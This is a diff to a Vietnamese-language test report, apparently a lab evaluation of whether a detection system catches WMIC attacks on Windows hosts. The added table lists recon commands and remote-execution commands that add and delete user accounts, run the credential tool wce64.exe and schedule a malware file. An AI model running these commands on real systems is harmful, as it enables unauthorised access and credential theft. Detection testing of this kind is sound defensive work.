@@ -47,7 +47,28 @@
 | Administrator | 192.168.255.129 | Windows 7 | Administrator | 10 | 8 |
 * Số lần thực hiện: 20
 * Tỉ lệ thành công: 80%
-* Với các lần thực hiện thu thập thông tin thông qua lệnh: `wmic bios get serial` hoặc `wmic process get name,processid` thì không bắt được. Tuy nhiên nếu sử dụng wmic để thực thi lệnh nào đó trên command line, tức thực hiện các tấn công Remote Command Execution
+* Với các lần thực hiện thu thập thông tin thông qua lệnh: `wmic bios get serialnumber` hoặc `wmic process get name, processid` thì không bắt được. Tuy nhiên nếu sử dụng wmic để thực thi lệnh nào đó trên command line, tức thực hiện các tấn công Remote Command Execution
+
+* Với các tấn công WMIC có thực hiện các thử nghiệm sau:
+| Username | Địa chỉ IP | Hệ điều hành | Vai trò của tài khoản | Câu lệnh thực thi | Loại tấn công | Số lần thực hiện | Số lần thành công |
+|:-------:|:------:|:------:|:------:|:------:|:------:|:------:|
+| sv | 192.168.255.129 | Windows 7 | Thành viên của Administrator group | `wmic bios list /format:list` | Thu thập thông tin bios name, serialnumber | 1 | 0 |
+| sv | 192.168.255.129 | Windows 7 | Thành viên của Administrator group | `wmic computersystem list /format:list` | Thu thập thông tin về hostname, domain, username | 1 | 0 |
+| sv | 192.168.255.129 | Windows 7 | Thành viên của Administrator group | `wmic process get name,processid` | Thông tin về các tiến trình trong hệ thống | 1 | 0 |
+| sv | 192.168.255.129 | Windows 7 | Thành viên của Administrator group | `wmic useraccount list /format:list` | Thông tin về toàn bộ các tài khoản có trong hệ thống: username, SID | 2 | 0 |
+| Administrator | 192.168.255.129 | Windows 7 | Administrator | `wmic bios list /format:list` | Thu thập thông tin bios name, serialnumber | 1 | 0 |
+| Administrator | 192.168.255.129 | Windows 7 | Administrator | `wmic computersystem list /format:list` | Thu thập thông tin về hostname, domain, username | 1 | 0 |
+| Administrator | 192.168.255.129 | Windows 7 | Administrator | `wmic process get name, processid` | Thông tin về các tiến trình trong hệ thống | 1 | 0 |
+| Administrator | 192.168.255.129 | Windows 7 | Administrator | `wmic useraccount list /format:list` | Thông tin về toàn bộ các tài khoản có trong hệ thống: username, SID | 2 | 0 |
+| sv | 192.168.255.100 | Windows Server 2008 | Thành viên của Administrator group | `wmic bios list /format:list` | Thu thập thông tin bios name, serialnumber | 1 | 0 |
+| Administrator | 192.168.255.100 | Windows Server 2008 | Administrator | `wmic bios list /format:list` | Thu thập thông tin bios name, serialnumber | 1 | 0 |
+| sv | 192.168.255.129 | Windows 7 | Thành viên của Administrator group | `wmic process call create "net user [username] [password] /add"` | Thêm một tài khoản vào hệ thống | 2 | 2 |
+| sv | 192.168.255.129 | Windows 7 | Thành viên của Administrator group | `wmic process call create "net user hacker /del"` | Xóa tài khoản khỏi hệ thống | 1 | 1 |
+| sv | 192.168.255.129 | Windows 7 | Thành viên của Administrator group | `wmic process call create "F:\HackingFolder\wce64.exe"` | Thực thi file trên hệ thống nạn nhân | 2 | 2 |
+
+| Administrator | 192.168.255.129 | Windows 7 | Administrator | `wmic process call create "net user [username] [password] /add"` | Thêm một tài khoản vào hệ thống | 2 | 2 |
+| Administrator | 192.168.255.129 | Windows 7 | Administrator | `wmic process call create "at [timestamp] [filename]"` | Chạy lập lịch file mã độc | 2 | 2 |
+
 
 ## Test case 6: wmiexec.vbs
 | Username | Địa chỉ IP | Hệ điều hành | Vai trò của tài khoản | Số lần thực hiện | Số lần thành công |
